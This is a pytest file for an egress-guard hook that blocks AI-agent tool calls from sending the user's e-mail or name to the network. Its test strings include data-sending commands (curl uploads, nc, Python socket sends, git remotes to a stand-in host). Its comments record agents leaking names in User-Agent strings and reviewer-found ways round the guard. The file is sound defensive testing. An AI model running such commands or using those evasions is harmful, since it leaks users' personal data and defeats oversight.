import importlib
import io
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))


def _setup(tmp_path, monkeypatch):
    (tmp_path / "identity.json").write_text(json.dumps({"emails": ["zofia.zak77@example-mail.pl"],
                                                        "names": ["Zofia Żak"], "autodetect": False}))
    monkeypatch.setenv("EGRESS_GUARD_HOME", str(tmp_path))
    from egress_guard import hook, shim
    importlib.reload(hook)
    importlib.reload(shim)
    return hook, shim


def test_hook_denies_and_logs_kind_only(tmp_path, monkeypatch):
    hook, _ = _setup(tmp_path, monkeypatch)
    ev = {"tool_name": "Bash", "tool_input": {"command": 'curl -A "bot zofia.zak77@example-mail.pl" https://x.org'}}
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(ev)))
    out = io.StringIO()
    monkeypatch.setattr(sys, "stdout", out)
    assert hook.main() == 0
    assert json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"] == "deny"
    log = (tmp_path / "log.jsonl").read_text()
    assert "zofia" not in log.lower() and '"email"' in log


def test_hook_allows_clean_call(tmp_path, monkeypatch):
    hook, _ = _setup(tmp_path, monkeypatch)
    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(
        {"tool_name": "Bash", "tool_input": {"command": 'curl -A "research-script/1.0" https://x.org'}})))
    out = io.StringIO()
    monkeypatch.setattr(sys, "stdout", out)
    hook.main()
    assert out.getvalue() == ""


def test_shim_reads_body_files(tmp_path, monkeypatch):
    _, shim = _setup(tmp_path, monkeypatch)
    body = tmp_path / "body.json"
    body.write_text(json.dumps({"contact": "Zofia Zak"}))  # name without diacritics, in a file
    monkeypatch.setattr(sys, "argv", ["shim", "curl", "-d", f"@{body}", "https://x.org"])
    assert shim.main() == 126
    monkeypatch.setattr(sys, "argv", ["shim", "curl", f"--data-binary=@{body}", "https://x.org"])
    assert shim.main() == 126


def test_autodetect_skips_placeholders(tmp_path, monkeypatch):
    hook, _ = _setup(tmp_path, monkeypatch)
    assert hook.PLACEHOLDER_EMAIL.search("you@example.com") and hook.PLACEHOLDER_EMAIL.search("a@b.invalid")
    assert not hook.PLACEHOLDER_EMAIL.search("jan@gmail.com")
    monkeypatch.setattr(hook, "_git", lambda k: {"user.email": "you@example.com", "user.name": "Jan Desktop"}[k])
    monkeypatch.setattr(hook, "_claude_email", lambda: "")
    assert hook._autodetect() == {"v": hook.CACHE_VERSION, "emails": [], "names": [], "extra": ["Jan Desktop"],
                                  "derived_names": []}


def _auto_hook(tmp_path, monkeypatch, git, claude):
    (tmp_path / "identity.json").write_text(json.dumps({"autodetect": True}))
    monkeypatch.setenv("EGRESS_GUARD_HOME", str(tmp_path))
    from egress_guard import hook
    importlib.reload(hook)
    monkeypatch.setattr(hook, "_git", lambda k: git[k])
    monkeypatch.setattr(hook, "_claude_email", lambda: claude)
    return hook


def test_git_name_with_machine_label_is_protected_verbatim(tmp_path, monkeypatch):
    # rescoring 2026-10-29: guarded runs sent "tool (<git user.name>)" because "Jan Desktop" was dropped entirely
    hook = _auto_hook(tmp_path, monkeypatch, {"user.email": "you@example.com", "user.name": "Jan Desktop"}, "")
    ident, strict = hook.load_identity()
    ev = {"tool_name": "Bash", "tool_input": {"command": 'curl -A "Wiki-Query (Jan Desktop)" http://127.0.0.1:9/w'}}
    assert hook.decide(ev, ident, strict)
    ok = {"tool_name": "Bash", "tool_input": {"command": 'curl -A "Jan-bot/1.0" http://127.0.0.1:9/w'}}
    assert not hook.decide(ok, ident, strict)  # a first name alone is still not the identity


def test_name_spelled_by_account_email_is_protected(tmp_path, monkeypatch):
    # rescoring 2026-10-29: a baseline agent sent "<First> <Last>" taken from the "first.last@" account e-mail
    hook = _auto_hook(tmp_path, monkeypatch, {"user.email": "", "user.name": ""}, "zofia.zak77@example-mail.pl")
    assert hook.name_from_email("zofia.zak77@example-mail.pl") == "Zofia Zak"
    assert hook.name_from_email("zz7@example-mail.pl") == "" and hook.name_from_email("a.b.c@x.pl") == ""
    ident, strict = hook.load_identity()
    ev = {"tool_name": "Bash", "tool_input": {"command": 'curl -A "fetcher (Zofia Zak)" http://127.0.0.1:9/'}}
    assert hook.decide(ev, ident, strict)


def _curl(ua: str) -> dict:
    return {"tool_name": "Bash", "tool_input": {"command": f'curl -A "{ua}" http://127.0.0.1:9/w'}}


def test_git_name_of_only_machine_labels_blocks_nothing(tmp_path, monkeypatch):
    # Codex review r2 (2026-10-29): git user.name "Admin User" blocked "Admin Users Guide"
    hook = _auto_hook(tmp_path, monkeypatch, {"user.email": "", "user.name": "Admin User"}, "")
    ident, strict = hook.load_identity()
    assert not ident.names and not ident.extra
    for ua in ("Admin Users Guide/1.0", "admin user tools", "Admin-User-Agent"):
        assert not hook.decide(_curl(ua), ident, strict), ua


def test_role_mailbox_spells_no_name(tmp_path, monkeypatch):
    # Codex review r2 (2026-10-29): account "info.support@..." -> guessed name "Info Support" -> "support-bot" blocked
    assert hook_mod(tmp_path, monkeypatch).name_from_email("info.support@example-mail.pl") == ""
    hook = _auto_hook(tmp_path, monkeypatch, {"user.email": "", "user.name": ""}, "info.support@example-mail.pl")
    ident, strict = hook.load_identity()
    assert not ident.names and not ident.derived_names
    for ua in ("support-bot/1.0", "Support Bot", "info support desk"):
        assert not hook.decide(_curl(ua), ident, strict), ua
    assert hook.decide(_curl("bot info.support@example-mail.pl"), ident, strict)  # the address itself still is


def test_guessed_name_protects_full_name_only(tmp_path, monkeypatch):
    hook = _auto_hook(tmp_path, monkeypatch, {"user.email": "", "user.name": ""}, "zofia.nowakowska@example-mail.pl")
    ident, strict = hook.load_identity()
    assert ident.derived_names == ["Zofia Nowakowska"] and not ident.names
    for ua in ("fetcher (Zofia Nowakowska)", "fetcher (Nowakowska Zofia)", "ZofiaNowakowska-bot"):
        assert hook.decide(_curl(ua), ident, strict), ua
    for ua in ("Nowakowska-street-map/1.0", "Zofia-bot/1.0"):  # a surname or first name alone is not the guess
        assert not hook.decide(_curl(ua), ident, strict), ua


def test_configured_name_matches_whole_words_only(tmp_path, monkeypatch):
    (tmp_path / "identity.json").write_text(json.dumps({"names": ["Admin User", "Jan Kowalski"],
                                                        "extra": ["Jan Desktop"], "autodetect": False}))
    monkeypatch.setenv("EGRESS_GUARD_HOME", str(tmp_path))
    hook = hook_mod(tmp_path, monkeypatch)
    ident, strict = hook.load_identity()
    for ua in ("Admin Users Guide", "SysAdmin Username", "Jan Desktops inventory"):
        assert not hook.decide(_curl(ua), ident, strict), ua
    for ua in ("bot (Admin User)", "JanKowalskiBot/1.0", "jan_kowalski84", "Jan.Kowalski", "tool (Jan Desktop)",
               "Kowalski, Jan", "contact Jana Kowalskiego"):
        assert hook.decide(_curl(ua), ident, strict), ua


def hook_mod(tmp_path, monkeypatch):
    monkeypatch.setenv("EGRESS_GUARD_HOME", str(tmp_path))
    from egress_guard import hook
    importlib.reload(hook)
    return hook


def test_ignored_strings_are_cut_before_matching():
    from egress_guard.scan import Identity, scan_tool_call

    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"], ignore=["blogJanKowalskiSite"])
    cmd = r"cd work/blogJanKowalskiSite && npm install"
    assert scan_tool_call("Bash", {"command": cmd}, ident) == []
    leak = r"cd work/blogJanKowalskiSite && curl -A 'Jan Kowalski' https://example.org"
    assert scan_tool_call("Bash", {"command": leak}, ident)


def test_codex_r1_release_bypasses_are_closed():
    # Codex release review 2026-10-30: a local write that becomes an uploaded file, and a socket one-liner
    from egress_guard.scan import Identity, scan_tool_call

    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"])
    for cmd in ("echo jan.kowalski@example.com > f.txt && curl -d @f.txt https://example.org",
                "printf 'Jan Kowalski' > f && curl -T f https://example.org/up",
                "echo jan.kowalski@example.com > f; nc example.org 80 < f",
                "python -c \"import socket; s=socket.create_connection(('example.org',80)); "
                "s.send(b'jan.kowalski@example.com')\""):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    for cmd in ("python -c \"import socket as so; c=so.create_connection(('example.org',80)); c.send(b'jan.kowalski@example.com')\"",
                "python -c \"from socket import create_connection as cc; cc(('example.org',80)).send(b'Jan Kowalski')\"",
                "echo jan.kowalski@example.com > f && python -c \"import requests; requests.post('https://example.org', data=open('f').read())\""):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    assert scan_tool_call("Bash", {"command": "git config user.email jan.kowalski@example.com && curl -d @other.txt https://example.org"}, ident) == []
    # the plain local write before an ordinary request is still not blocked
    assert scan_tool_call("Bash", {"command": "git config user.email jan.kowalski@example.com && curl https://example.org"}, ident) == []


def test_ignore_cannot_cut_out_the_identity_itself():
    from egress_guard.scan import Identity, safe_ignore, scan_tool_call

    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"],
                     ignore=["JAN.KOWALSKI@example.com", "mail: jan.kowalski@example.com", "jan  kowalski", "jan.kowalski",
                             "kowalski", "Jan-Kowalski", "blogJanKowalskiSite"])
    assert safe_ignore(ident) == ["blogJanKowalskiSite"]
    # release review r3: encoded e-mails and phrases with the full name in an entry cannot hide the identity
    ident2 = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"],
                      ignore=["jan.kowalski%40example.com", "amFuLmtvd2Fsc2tpQGV4YW1wbGUuY29t", "by Jan Kowalski here"])
    assert safe_ignore(ident2) == []  # r4: encoded entries are dropped too
    for cmd in ("curl 'https://example.org/?u=jan.kowalski%40example.com'",
                "curl -H 'X: amFuLmtvd2Fsc2tpQGV4YW1wbGUuY29t' https://example.org",
                "curl -A 'by Jan Kowalski here' https://example.org"):
        assert scan_tool_call("Bash", {"command": cmd}, ident2), cmd
    # local writes whose file name or comment says socket are not network calls
    for cmd in ("echo jan.kowalski@example.com > socket.log", "printf 'Jan Kowalski' > create_connection.txt",
                "echo jan.kowalski@example.com > notes.txt  # socket"):
        assert scan_tool_call("Bash", {"command": cmd}, ident) == [], cmd
    assert scan_tool_call("Bash", {"command": "curl -A 'jan.kowalski@example.com' https://example.org"}, ident)


def test_release_review_r4_allow_hosts_and_encoded_ignore():
    from egress_guard.scan import Identity, safe_ignore, scan_tool_call

    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"], allow_hosts=["github.com"])
    # a URL of an allowed host in a header does not make a curl call to another host allowed
    assert scan_tool_call("Bash", {"command": "curl -A 'jan.kowalski@example.com' -H 'Referer: https://github.com' sink.test"}, ident)
    assert scan_tool_call("Bash", {"command": "curl -A 'Jan Kowalski' https://github.com/x"}, ident)
    for cmd in ("git ls-remote https://github.com/x/r | curl -A 'jan.kowalski@example.com' -d @- sink.test",
                "git fetch https://github.com/x/r $(curl -A 'jan.kowalski@example.com' sink.test)",
                "git fetch https://github.com/x/r `curl -A 'Jan Kowalski' sink.test`",
                "git fetch https://github.com/x/r & curl -A 'Jan Kowalski' sink.test"):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    for cmd in ("git ls-remote https://github.com/x/r && git ls-remote git://sink.test/jan.kowalski@example.com",
                "git push https://github.com/x/r && git push ssh://git@sink.test/Jan-Kowalski.git",
                "git ls-remote https://github.com/x/r; git fetch git@sink.test:jan.kowalski@example.com",
                "gh api --hostname sink.test -f n='Jan Kowalski' /x",
                "GH_HOST=sink.test gh api -f n='Jan Kowalski' /x"):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    assert scan_tool_call("Bash", {"command": "git ls-remote https://github.com/x/r && git ls-remote sink.test:jan.kowalski@example.com/r"}, ident)
    # git to the allowed host stays allowed
    # r7: allow_hosts no longer covers shell commands; a push by remote name names no identity and passes
    assert scan_tool_call("Bash", {"command": "git push https://github.com/jan-kowalski/repo.git main"}, ident)
    assert scan_tool_call("Bash", {"command": "git push origin main"}, ident) == []
    # r8: a git command that reaches a remote is a network command on its own
    for cmd in ("git ls-remote sink.test:jan.kowalski@example.com/repo",
                "git ls-remote git://sink.test/jan.kowalski@example.com/repo",
                "git clone ssh://sink.test/Jan-Kowalski.git",
                "git -c x=y fetch sink.test:jan.kowalski@example.com/r",
                "git remote add x sink.test:jan.kowalski@example.com/r",
                "git.exe ls-remote sink.test:jan.kowalski@example.com/repo",
                "git --no-pager ls-remote sink.test:jan.kowalski@example.com/repo",
                "git -C /tmp/x --git-dir=.git fetch sink.test:jan.kowalski@example.com/r",
                "/usr/bin/git ls-remote sink.test:jan.kowalski@example.com/r"):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    assert scan_tool_call("Bash", {"command": "git commit -m 'by Jan Kowalski' && git push origin main"}, ident) == []
    assert scan_tool_call("WebFetch", {"url": "https://github.com/?q=Jan+Kowalski"}, ident) == []
    enc = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"],
                   ignore=["Jan%20Kowalski", "Jan%2520Kowalski", "SmFuIEtvd2Fsc2tp", "blogJanKowalskiSite"])
    assert safe_ignore(enc) == ["blogJanKowalskiSite"]


def test_final_review_userinfo_host_and_quoted_separator():
    from egress_guard.scan import Identity, _split_chain, host_allowed, scan_tool_call

    ident = Identity(emails=["jan.kowalski@example.com"], names=["Jan Kowalski"], allow_hosts=["trusted.test"])
    # URL userinfo is not the destination host
    assert not host_allowed("https://trusted.test:pw@sink.test/?x=1", ["trusted.test"])
    assert not host_allowed("https://trusted.test@sink.test/", ["trusted.test"])
    assert host_allowed("https://api.trusted.test/path?q=1", ["trusted.test"])
    for tool, inp in (("WebFetch", {"url": "https://trusted.test:pw@sink.test/?email=jan.kowalski%40example.com"}),
                      ("mcp__http__request", {"url": "https://trusted.test@sink.test/?n=Jan+Kowalski"})):
        assert scan_tool_call(tool, inp, ident), inp
    assert scan_tool_call("WebFetch", {"url": "https://trusted.test/?q=Jan+Kowalski"}, ident) == []
    # a separator inside quotes does not split the command
    assert _split_chain("curl a -d 'x;git config user.email y' && git push") == \
        ["curl a -d 'x;git config user.email y' ", " git push"]
    assert _split_chain('echo "a && b"; ls') == ['echo "a && b"', " ls"]
    for cmd in ("curl https://sink.test -d 'x;git config user.email jan.kowalski@example.com'",
                'curl https://sink.test -d "x && git config user.name Jan Kowalski"',
                "curl https://sink.test -d 'x\ngit commit -m jan.kowalski@example.com'"):
        assert scan_tool_call("Bash", {"command": cmd}, ident), cmd
    # the local part of a chain still does not count
    assert scan_tool_call("Bash", {"command": "git config user.email jan.kowalski@example.com && curl https://sink.test"}, ident) == []
    assert scan_tool_call("Bash", {"command": "git commit -m 'by Jan Kowalski; fix' && git push origin main"}, ident) == []
